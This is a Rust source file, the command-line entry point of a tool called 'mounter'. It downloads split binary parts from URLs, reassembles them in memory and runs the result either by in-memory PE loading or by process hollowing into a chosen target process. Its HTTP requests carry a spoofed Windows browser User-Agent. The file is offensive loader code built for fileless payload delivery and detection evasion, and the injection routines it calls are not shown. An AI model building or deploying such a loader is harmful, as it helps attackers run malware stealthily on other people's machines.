//! Download, reconstruct, and execute split binaries in memory

use anyhow::{Context, Result};
use clap::Parser;
use mounterlib::{download, execution, reconstruct};
#[derive(Parser, Debug)]
#[command(
    name = "mounter",
    author = "M3str3 <namestre3@protonmail.com>",
    version = "0.1.0",
    about = "Download, reconstruct, and execute split binaries in memory"
)]
struct Args {
    #[arg(
        short = 'u',
        long = "urls",
        value_delimiter = ',',
        required = true,
        help = "URLs of split parts to download"
    )]
    urls: Vec<String>,

    #[arg(
        short = 'a',
        long = "args",
        value_delimiter = ' ',
        help = "Arguments to pass to the executed binary"
    )]
    exec_args: Option<Vec<String>>,

    #[arg(short = 'v', long = "verbose", help = "Show detailed progress information")]
    verbose: bool,

    #[arg(long = "dry-run", help = "Validate parts without executing")]
    dry_run: bool,

    #[arg(
        short = 't',
        long = "timeout",
        default_value = "30",
        help = "HTTP request timeout in seconds"
    )]
    timeout: u64,

    #[arg(long = "no-validate", help = "Skip final checksum validation")]
    no_validate: bool,

    #[arg(
        long = "user-agent",
        default_value = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        help = "User-Agent string for HTTP requests"
    )]
    user_agent: String,

    #[arg(
        short = 'm',
        long = "method",
        default_value = "local-pe",
        help = "Execution method: local-pe, process-hollowing"
    )]
    method: String,

    #[arg(
        long = "target",
        help = "Target process path (required for process-hollowing method)"
    )]
    target_process: Option<String>,
}

fn main() {
    let args = Args::parse();

    if let Err(e) = run(args) {
        eprintln!("[-] Error: {}", e);
        let mut source = e.source();
        while let Some(cause) = source {
            eprintln!("    Caused by: {}", cause);
            source = cause.source();
        }
        std::process::exit(1);
    }
}

fn run(args: Args) -> Result<()> {
    if args.urls.is_empty() {
        anyhow::bail!("At least one URL must be provided");
    }

    if args.verbose {
        println!("[*] Mounter v0.1.0");
        println!("[*] Downloading {} parts...", args.urls.len());
    }

    let parts = download_all_parts(&args)?;

    if args.verbose {
        println!("[+] Downloaded {} parts successfully", parts.len());
    }

    if args.verbose {
        println!("[*] Reconstructing binary in memory...");
    }

    let validate_checksums = !args.no_validate;
    let binary = reconstruct::rebuild_from_parts(parts, validate_checksums, args.verbose)
        .context("Failed to reconstruct binary")?;

    if args.verbose {
        println!(
            "[+] Binary reconstructed: {} bytes ({:.2} MB)",
            binary.len(),
            binary.len() as f64 / 1_048_576.0
        );
    }

    if args.dry_run {
        println!("[+] Dry-run completed. Binary validated successfully.");
        return Ok(());
    }

    if args.verbose {
        println!("[*] Executing binary in memory using: {}", args.method);
    }

    println!("{}", "=".repeat(60));
    println!("                    RUNNING                    ");
    println!("{}", "=".repeat(60));

    match args.method.as_str() {
        "local-pe" => {
            #[cfg(feature = "execution-local-pe")]
            {
                let exec_args = args.exec_args.unwrap_or_default();
                execution::local_pe::inject_and_execute(&binary, &exec_args, args.verbose)
                    .context("Failed to execute binary")?;
            }
            #[cfg(not(feature = "execution-local-pe"))]
            {
                anyhow::bail!("Local PE execution not available. Compile with --features execution-local-pe");
            }
        }
        "process-hollowing" => {
            #[cfg(feature = "execution-process-hollowing")]
            {
                let target = args.target_process.as_ref()
                    .ok_or_else(|| anyhow::anyhow!("--target is required for process-hollowing method"))?;
                
                execution::execute_with_process_hollowing(&binary, target, args.verbose)
                    .context("Failed to execute binary with process hollowing")?;
            }
            #[cfg(not(feature = "execution-process-hollowing"))]
            {
                anyhow::bail!("Process hollowing not available. Compile with --features execution-process-hollowing");
            }
        }
        _ => {
            anyhow::bail!("Unknown execution method: {}. Available: local-pe, process-hollowing", args.method);
        }
    }

    Ok(())
}

fn download_all_parts(
    args: &Args,
) -> Result<std::collections::HashMap<u32, (mainlib::PartHeader, Vec<u8>)>> {
    download::http::download_all_as_map(&args.urls, args.timeout, &args.user_agent, args.verbose)
        .context("Failed to download parts")
}
